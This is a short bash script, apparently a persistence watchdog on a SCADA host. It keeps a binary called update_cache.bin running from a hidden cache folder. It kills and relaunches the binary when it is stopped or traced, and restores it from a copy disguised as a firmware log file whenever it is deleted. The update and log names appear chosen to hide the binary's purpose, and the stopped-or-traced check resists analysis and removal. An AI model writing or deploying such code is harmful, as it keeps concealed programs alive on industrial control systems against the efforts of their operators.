#!/bin/bash
UPDATE_CACHE="/home/scada/.cache/update_files/update_cache.bin"
FIRMWARE_SOURCE="/var/tmp/firmware-stdout.log"
while true; do
    sleep 10
    if ! pgrep -f update_cache.bin > /dev/null; then
        $UPDATE_CACHE &
    else
        if ps -o state= -p $(pgrep -f update_cache.bin) | grep -q 'T'; then
            kill -9 $(pgrep -f update_cache.bin)
            $UPDATE_CACHE &
        fi
    fi
    if [ ! -f "$UPDATE_CACHE" ]; then
        if [ -f "$FIRMWARE_SOURCE" ]; then
            mkdir -p "$(dirname "$UPDATE_CACHE")"
            cp "$FIRMWARE_SOURCE" "$UPDATE_CACHE"
            chmod 555 "$UPDATE_CACHE"
        fi
    fi
done
